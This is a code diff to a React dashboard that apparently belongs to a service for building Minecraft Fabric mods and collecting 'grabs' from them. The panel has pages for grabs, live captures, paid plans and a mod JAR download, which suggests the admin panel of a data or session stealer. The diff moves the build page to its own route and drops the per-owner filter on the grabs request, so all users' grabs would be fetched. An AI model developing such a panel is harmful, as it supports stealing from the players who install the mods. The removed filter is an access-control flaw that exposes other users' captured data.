@@ -29,12 +29,11 @@ function Dashboard({ userEmail }) {
   const [grabCount, setGrabCount] = useState(0);
 
   useEffect(() => {
-    if (!userEmail) return;
-    fetch(`/api/grabs?owner_email=${encodeURIComponent(userEmail)}`)
+    fetch('/api/grabs')
       .then(r => r.json())
       .then(d => setGrabCount(d.grabs?.length || 0))
       .catch(() => {});
-  }, [userEmail]);
+  }, []);
 
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
@@ -71,47 +70,6 @@ function Dashboard({ userEmail }) {
 }
 
 
-
-function Build({ userEmail }) {
-  return (
-    <div style={{ flex: 1, padding: '28px 36px' }}>
-      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
-      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>
-
-      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
-          <span>🔨</span> Build Mod
-        </div>
-        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
-          <div style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
-            Fabric 1.21.11
-            <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
-          </div>
-        </div>
-        <a href="/mods/consentmod-1.0.0.jar" download style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 8, textDecoration: 'none' }}>
-          <span>↓</span> Download JAR
-        </a>
-      </div>
-
-      <div>
-        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
-        <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-            <span style={{ fontSize: 20 }}>📄</span>
-            <div>
-              <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>fabric-1.21.11.jar</div>
-              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>May 25, 2026 · 16.0 MB</div>
-            </div>
-          </div>
-          <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
-            <span>↓</span> Download
-          </button>
-        </div>
-      </div>
-    </div>
-  );
-}
 
 function Plans() {
   return (
@@ -332,7 +290,7 @@ export default function DashboardPage() {
         <div style={{ flex: 1 }}>
           <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
           <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
-          <NavItem icon="🔨" label="Build" active={page === 'build'} onClick={() => setPage('build')} />
+          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
           <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
           <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
           <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
@@ -343,7 +301,6 @@ export default function DashboardPage() {
         </div>
       </aside>
       {page === 'dashboard' && <Dashboard userEmail={userEmail} />}
-      {page === 'build' && <Build userEmail={userEmail} />}
       {page === 'plans' && <Plans />}
       {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
       {page === 'live' && <LiveCaptures />}
